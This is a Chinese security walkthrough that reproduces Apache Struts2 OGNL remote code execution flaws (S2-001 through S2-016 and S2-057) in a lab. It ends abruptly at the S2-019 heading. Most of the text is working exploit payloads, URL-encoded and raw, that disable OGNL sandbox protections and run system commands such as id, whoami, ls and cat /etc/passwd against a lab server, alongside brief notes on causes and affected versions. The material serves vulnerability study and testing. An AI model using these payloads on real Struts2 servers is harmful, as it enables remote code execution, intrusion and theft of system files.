1. Struts2简介
------------

#### Struts2是一个基于[MVC设计模式](https://baike.baidu.com/item/MVC%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/8160955)的[Web应用框架](https://baike.baidu.com/item/Web%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/4262233)，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的[体系结构](https://baike.baidu.com/item/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/8174145)与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与[Servlet](https://baike.baidu.com/item/Servlet)API完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着非常大的变化，但是相对于WebWork，Struts 2的变化很小。 *&lt;--来源：百度百科--&gt;*

2.下载Struts2
-----------

##### 各版本下载链接：

```php
http://archive.apache.org/dist/struts/binaries/
```

#### 下载环境：Windows7 x64（需要有java环境）

#### 安装完jdk后，安装tomcat，默认下一步就行

![image-20210707153215723](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-91084f4495999405c0ae1d86df8f78e7ac9b74c2.png)

![image-20210707153101670](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-811e74ccd1c9e02223ccaa0b290a1a8331965f30.png)

![image-20210707154204994](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-265d7f51ecf0cf9f087c7696052f5f0223a1a7d6.png)

#### 这里上传两个war包到网站根目录下

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5b014931e7a339111c4eddf5532badd18f87dad2.png)

#### 运行bin目录下的tomcat8

![image-20210707155057770](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e7b7aa33f66807bef5fb8b3eaa3145fdbed364b6.png)

#### 两个war包即可被部署好（开启过程中上传war包可自动部署）

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-61486ceb7140a6ef9fbcf6ef0a393ead8ae4249f.png)

#### 远程访问成功

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-568e8d2b9684487da2404f68c61aa40bb39a1525.png)

3.漏洞复现(本地)
----------

### 3.1 S2-057远程代码执行漏洞

![image-20210707161420877](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8898d443a4475517495f700b7ad876f4b33e3751.png)

#### 对该页面进行抓包

![image-20210707162017929](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9cb1b7368c870fd734e5c4c33ffb2deba8ae4578.png)

#### 验证漏洞是否存在，poc如下:

```php
/%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ipconfig%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action
```

![image-20210707164954020](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3accb46b2c4c36177936e59017fefd42ddc25599.png)

### 3.2 S2-001远程执行代码漏洞

#### 漏洞原理：

##### 该漏洞因用户提交表单数据且验证失败时，后端会将用户之前提交的数据使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL表达式解析，所以可以直接构造Payload进行命令执行。

#### 影响版本：

```php
Struts 2.0.0 - 2.0.8
```

##### 验证漏洞是否存在，输入

```php
%{'zcc'}
```

##### 返回zcc就是存在该漏洞

![image-20210708095826223](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c1f475176a08b1ae45bc2e3e104ed3171cf32063.png)

![image-20210708095804739](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e572fe3824358ca7c10f45495d24b3339f432c4b.png)

##### 构造poc，填入password框：

```php
Poc获取tomcat路径：
%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}
```

![image-20210708101433289](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9e4d08a2df47b03f7d49fd83a46c78c8e8df2f0f.png)

![image-20210708135151541](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bdc2c865d1baa547443e7d0b5f2d67e3a31b718a.png)

4.Vulhub漏洞复现
------------

### 4.1 S2-001远程代码执行漏洞

#### 开启struts2-001漏洞

![image-20210708135805848](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5de078982e17f9e71d999a1529a5c6533654a357.png)

#### 验证是否开启

![image-20210708135910127](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-915d473f7936f767f09dfbefd69798fa5e7917a1.png)

![image-20210708140019492](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0e00ca7964c8f78112a0da0bc7be8d67a6687f13.png)

#### 验证是否存在

![bdbedc76421163ec734cee68dff927a](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-53fc216850d2bed043011219d329359478cfd318.png)

![322449e9453684ee7ee4226b8d99c39](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-151faf0fe67caf52ddacee46f09b90edf368bf25.png)

#### 获取tomcat路径

```php
%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}
```

![image-20210708140432678](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8a4fae704a550bd845643e0dfc4ca23ec3658c55.png)

![image-20210708140620554](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d252b09cee23a86db39c78a4b47ffd970931bab6.png)

#### 获取网站的真实路径

```php
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
```

![image-20210708140918567](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-acb86ffde63a209e40f61e1c41a4eba2e91c749a.png)

![image-20210708140928436](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c1896fa7e7a5257993c3aa3d874da2755a53e3b3.png)

#### 执行命令

```php
%{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),
#b=#a.getInputStream(),
#c=new java.io.InputStreamReader(#b),
#d=new java.io.BufferedReader(#c),
#e=new char[50000],
#d.read(#e),
#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),
#f.getWriter().println(new java.lang.String(#e)),
#f.getWriter().flush(),#f.getWriter().close()
}
```

![image-20210708141252287](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3e9932d8d5ff4964939d37d84314668fe99cce1c.png)

![image-20210708141301722](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5e451e0cc5c05162d3b12f106dfde29e3109a4eb.png)

```php
%{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;cat&quot;,&quot;/etc/passwd&quot;})).redirectErrorStream(true).start(),
#b=#a.getInputStream(),
#c=new java.io.InputStreamReader(#b),
#d=new java.io.BufferedReader(#c),
#e=new char[50000],
#d.read(#e),
#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),
#f.getWriter().println(new java.lang.String(#e)),
#f.getWriter().flush(),#f.getWriter().close()
}
```

![image-20210708141616746](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-12de2a9f3d53e2777f352891b393790b3d1f5701.png)

![image-20210708141958858](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4a873ccf4f1e95f821d8a01b7f6343533bee3c37.png)

### 4.2 S2-005远程代码执行漏洞

#### 漏洞原理

##### s2-005漏洞的起源源于s2-003（受影响版本：低于Struts2.0.12），struts2会将http的每个参数名解析为ODNL语句执行（可理解为Java代码）。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码（\\u0023)或8进制（\\43）即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置（禁止静态方法调用和类方法执行等）来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这两个选项打开，S2-003的修补方式把自己上了一个锁，但是把钥匙插在了锁头上。

#### 影响版本

```php
Struts 2.0.0-2.1.8.1
```

#### 绕过过程

```php
1. 在S2-003中\u0023用于绕过struts2的过滤器#
2. 在S2-003 struts2添加安全模式（沙盒）之后
3. 在S2-005中，使用OGNL表达式关闭安全模式并再次绕过
```

#### 漏洞启动

![image-20210708144036310](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-283a4271730007831caaa17e1ce95a47f9a26b31.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-28ffd8fe5d5563786edcc99594bb7be8d35383bf.png)

##### 构建poc，在tmp目录下创建一个success文件

```php
(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1
```

![image-20210708145030165](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cbef190eb288eefe661187eb89f0414505b4ef62.png)

![image-20210708152324774](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b2b4267ff3611432cc5b7ee71914c03b1987aed3.png)

##### 这里我找了半天success文件，发现tmp目录下没有，后面经yb妹妹提醒才知道，是在docker底层目录中，是我菜鸡了。

#### 执行命令

![image-20210708162106652](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bec5a16351b1f4bca61c7306d2576c238b81e4b7.png)

![image-20210708162136530](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-09d689544febdec52a529fc3a372171c7a155f5d.png)

### 4.3 S2-007远程代码执行漏洞

#### 漏洞原理

##### age来自于用户输入，传递一个非整数给id导致错误，struts会将用户的输入当作ongl表达式执行，从而导致了漏洞。

#### 影响版本

```php
2.0.0 - 2.2.3
```

#### 启动漏洞

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-27af9a8841b08c76807866c2de8b7d83e05359a2.png)

##### 访问页面

![image-20210708163733316](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-65b344e53156d253be069d292eeb04b99f19bd55.png)

![image-20210708163520607](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5ac727584e35850c69b1eb54e9c229bc3cd1a7cb.png)

##### 这里如果访问不了的话，可以在这里清理一下缓存，即可成功访问

##### 谷歌和火狐的分别如下操作

![image-20210708163646768](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2bcc32475a5eb44926a8b49e74805dede5bff998.png)

![image-20210708163448471](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-71b32cbc3daceee5928e8813f68eb4becb6848d7.png)

#### 验证漏洞

##### 在年龄中输入非数字类型点击登录，年龄框中的value变成11，即可证明漏洞存在！

![image-20210708164207663](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-858cc51d027656085cedcd5876a8e668c1db044f.png)

##### 查找底层目录信息

##### poc

```php
%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%20/%27%29.getInputStream%28%29%29%29+%2B+%27
```

![image-20210708164825548](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9f6eb1c81ea57faf3ae97ffb713acb862d95fb56.png)

##### 枚举zcc.txt信息

##### poc

```php
%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27cat%20/zcc/zcc.txt%27%29.getInputStream%28%29%29%29+%2B+%27
```

![image-20210708165538612](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4e559b0070f4ce0be0fa1b8c0b2ab5c11ca236cb.png)

![image-20210708165612582](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cf96ccaed89bf507252ca3760bd0bdf1123148fb.png)

##### 可以执行任意代码的exp

```php
' + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExe
cution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
```

![image-20210708170330738](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-91b503672ba9d925f94eee339bb10997dece6852.png)

![image-20210708170344336](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9467bb072acb5886e9ae6d6d2bf928ccc97e0aba.png)

```php
%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29+%2B+%27
```

![image-20210708170521479](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4eb28485176b509d01b75ceec1bc8414f9d151e6.png)

![image-20210708170709366](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-68588ac13e4c170afe57f1836cc1e23599622784.png)

##### 查看日志

![image-20210708170948120](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7191276ed464850e49202fd9a5138254ef3eea68.png)

### 4.4 S2-008远程代码执行漏洞

#### 漏洞描述

##### S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋。

#### 影响版本

```php
2.1.0 - 2.3.1
```

#### 开启漏洞

![image-20210708171158605](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0ee45bbfe9450c427261b61622aafd6de24b9a34.png)

##### poc

```php
/devmode.action?debug=command&amp;e xpression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=123456789&amp;command=whoami
```

![image-20210708171549820](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5d76843b4d0e1e92773a9a5f0c527bb801025041.png)

### 4.5 S2-009远程代码执行漏洞

#### 漏洞描述

##### OGNL提供了广泛的表达式评估功能等功能。该漏洞允许恶意用户绕过ParametersInterceptor内置的所有保护（正则表达式，拒绝方法调用），从而能够将任何暴露的字符串变量中的恶意表达式注入进行进一步评估。

##### 在S2-003和S2-005中已经解决了类似的行为，但事实证明，基于列入可接受的参数名称的结果修复仅部分地关闭了该漏洞。

##### ParametersInterceptor中的正则表达式将top \['foo'\]（0）作为有效的表达式匹配，OGNL将其作为（top \['foo'\]）（0）处理，并将“foo”操作参数的值作为OGNL表达式求值。这使得恶意用户将任意的OGNL语句放入由操作公开的任何String变量中，并将其评估为OGNL表达式，并且由于OGNL语句在HTTP参数中，攻击者可以使用黑名单字符（例如＃）禁用方法执行并执行任意方法，绕过ParametersInterceptor和OGNL库保护。

#### 影响版本

```php
Struts 2.1.0 - 2.3.1.1
```

#### 漏洞启动

![image-20210708173059857](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a92763b5f177fa766c8d95c0041853946b431b41.png)

![image-20210708173543165](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-997dc245393e573096225e85ea1c0008bbd89d6c.png)

##### 验证漏洞是否存在，poc-1

```php
/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]
```

![image-20210709085739301](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2d4c0b520f4cf5844f3b1affd70dca717293fbcf.png)

![image-20210709090303111](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d21915b3447883f54b28e556c0eaa359ce510114.png)

##### 构造poc-2，枚举/etc/passwd

```php
http://192.168.9.234:8080/ajax/example5?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(&quot;cat /etc/passwd&quot;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]
```

![image-20210709090654277](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e1f4bb48ccc7c09b7e95d01312f0b89609b6d00d.png)

##### 构造poc-3，创建用户执行命令

```php
http://192.168.9.234:8080/ajax/example5?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boo%20lean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22touch%20/tmp/dayu009%22).ge%20tInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%2%203kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27m%20eh%27)]
```

![image-20210709091120046](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2d8b090dbc911ade89c9e1728cdb35480beb1c63.png)

![image-20210709091156305](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-85c8795901e1905f2150e508fab328b8866e6dca.png)

##### Poc-4

```php
z[%28name%29%28%27meh%27%29]&amp;age=12313&amp;name=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#s=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#s.println(#d),#s.close())(meh)
```

![image-20210709091552051](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-de5e7d6097dd54a0a4c65635c24a614e0f9a20f4.png)

![image-20210709094726752](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fc200f9caf47ca17cbc00bd18df421d1ff17a889.png)

### 4.6 S2-012远程代码执行漏洞

#### 漏洞原理

##### 如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param\_name} 作为重定向变量

```php
x ml
&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt;
    &lt;action name=&quot;user&quot; class=&quot;com.demo.action.UserAction&quot;&gt;
        &lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=${name}&lt;/result&gt;
        &lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt;
        &lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt;
    &lt;/action&gt;
&lt;/package&gt;
```

##### 这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。

#### 影响版本

```php
2.1.0 - 2.3.13
```

#### 启动漏洞

![image-20210709100841677](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-69192bb717ecade4e07c88749a8deff5780c5160.png)

![image-20210709100857766](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7cc49f60c4652d7195e787de8538f235bc6dd77e.png)

#### poc-1

```php
%25%7B%23a%3D(new java.lang.ProcessBuilder(new java.lang.String%5B%5D%7B%22%2Fbin%2Fbash%22%2C%22-c%22%2C %22ls%22%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew java.io.InputStreamReader(%23b)%2C%23d%3Dnew java.io.BufferedReader(%23c)%2C%23e%3Dnew char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D
```

![image-20210709103433482](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ba57daff6526f70f0807504a134e1ef9b10d8fee.png)

##### 需要url编码，否则500

#### poc2

```php
%25%7B%23a%3D(new java.lang.ProcessBuilder(new java.lang.String%5B%5D%7B%22cat%22%2C %22%2Fetc%2Fpasswd%22%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew java.io.InputStreamReader(%23b)%2C%23d%3Dnew java.io.BufferedReader(%23c)%2C%23e%3Dnew char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D
```

![image-20210709103956924](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f2b49e1c0f446b0e549e5e1fbcb756652dedd74c.png)

### 4.7 S2-013远程代码执行漏洞

#### 漏洞原理

##### struts2的标签中 `&lt;s:a&gt;` 和 `&lt;s:url&gt;` 都有一个 includeParams 属性，可以设置成如下值

1. ##### *none* - URL中*不*包含任何参数（默认）
2. ##### *get* - 仅包含URL中的GET参数
3. ##### *all* - 在URL中包含GET和POST参数

##### 当`includeParams=all`的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。

##### 此时`&lt;s:a&gt;` 或`&lt;s:url&gt;`尝试去解析原始请求参数时，会导致OGNL表达式的执行

#### 影响版本

```php
2.0.0 - 2.3.14
```

#### 启动漏洞

![image-20210709104435576](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-83a7bd98abdd41ad9983f0ee3422f16e17a8a9d3.png)

![image-20210709105117366](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ba96ec80641b19cbe8d477607bc87ae7f1f20476.png)

##### poc-1

```php
http://192.168.9.234:8080/l ink.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D
```

![image-20210709105256449](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7ccb291d2732ac27b0c4f33a5b153def10fe0943.png)

```php
http://192.168.9.234:8080/l ink.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27ls%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D
```

![image-20210709110403375](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-71009be2e8e23a1409a0a20155d685f8bf574dd7.png)

### 4.8 S2-015远程代码执行漏洞

#### 漏洞原理

##### Apache Struts 2是用于开发JavaEE Web应用程序的开源Web应用框架。Apache Struts 2.0.0至2.3.14.2版本中存在远程命令执行漏洞。远程攻击者可借助带有‘${}’和‘%{}’序列值（可导致判断OGNL代码两次）的请求，利用该漏洞执行任意OGNL代码。

#### 影响版本

```php
Struts 2.0.0 - 2.3.14.2
```

#### 启动漏洞

![image-20210709111207072](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b12ba4ec38819952dc0c68399e33c69aa57c5705.png)

![image-20210709111228374](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0384357a244a61985e701e4c7e5bc9dcbaa10414.png)

##### 验证漏洞是否存在poc-1（这里是经过url编码的）

```php
%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27)%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream())%2C%23q%7D.action
```

![image-20210709140430412](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4c55eae8a9b8a8b84e8a3ad7552e13ee0f1926ea.png)

```php
%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredFiel
d%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.comm
ons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%2C%23q%7D.action
```

![image-20210709140550955](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cd8bc028003ddf9907de37650734101d7c9685f2.png)

### 4.9 S2-016远程代码执行漏洞

#### 漏洞原理

##### 在struts2中，DefaultActionMapper类支持以"action:"、“redirect:”、"redirectAction:"作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。

#### 影响版本

```php
Struts 2.0.0 – 2.3.15
```

#### 启动漏洞

![image-20210709141210926](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1231aeab903ec7bb084b803ef157fe1b37e24230.png)

![image-20210709142755893](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b225c07f50863b5335e24dd754d66a4ef5fc8b84.png)

##### 验证漏洞是否存在-poc-1

```php
http://192.168.9.234:8080/index.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D
```

![image-20210709143222540](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bdf89a0f54ee31bdc8fcf2a675f6bf5ea14fc106.png)

##### poc-2

```php
http://192.168.9.234:8080/index.action?redirect:%24%7B%23req%3D%23context.get(%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletReq%27%2B%27uest%27)%2C%23resp%3D%23context.get(%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletRes%27%2B%27ponse%27)%2C%23resp.setCharacterEncoding(%27UTF-8%27)%2C%23ot%3D%23resp.getWriter ()%2C%23ot.print(%27web%27)%2C%23ot.print(%27path%3A%27)%2C%23ot.print(%23req.getSession().getServletContext().getRealPath(%27%2F%27))%2C%23ot.flush()%2C%23ot.close()%7D
```

![image-20210709144813571](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4ec9fdad06ce07735430ff3a5991471c5ce6289c.png)

### 4.10 S2-019远程代码执行漏洞

#### 漏洞原理

